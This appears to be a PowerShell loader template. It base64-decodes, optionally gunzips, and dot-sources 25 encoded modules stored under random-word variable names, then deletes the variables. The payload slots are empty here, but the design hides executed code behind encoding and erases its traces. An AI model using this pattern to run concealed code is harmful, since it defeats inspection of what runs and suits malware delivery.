#Requires -Version 2

$Smokehouse = ""
$Extroverts = ""
$Incarnates = ""
$Loquacious = ""
$Profundity = ""
$Thunderous = ""
$Anchorages = ""
$Protestant = ""
$Outperform = ""
$Abbreviate = ""
$Skittering = ""
$Thankfully = ""
$Diabolical = ""
$Blockhouse = ""
$Periscopes = ""
$Outsourced = ""
$Firehouses = ""
$Bookmaking = ""
$Grotesques = ""
$Geologists = ""
$Shoemakers = ""
$Shiftiness = ""
$Malodorous = ""
$Antecedent = ""
$Regimental = ""

$Modules = @($Smokehouse,$Extroverts,$Incarnates,$Loquacious,$Profundity,$Thunderous,$Anchorages,$Protestant,$Outperform,$Abbreviate,$Skittering,$Thankfully,$Diabolical,$Blockhouse,$Periscopes,$Outsourced,$Firehouses,$Bookmaking,$Grotesques,$Geologists,$Shoemakers,$Shiftiness,$Malodorous,$Antecedent,$Regimental)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Smokehouse","Extroverts","Incarnates","Loquacious","Profundity","Thunderous","Anchorages","Protestant","Outperform","Abbreviate","Skittering","Thankfully","Diabolical","Blockhouse","Periscopes","Outsourced","Firehouses","Bookmaking","Grotesques","Geologists","Shoemakers","Shiftiness","Malodorous","Antecedent","Regimental") | ForEach-Object { Remove-Variable -Name $_ }
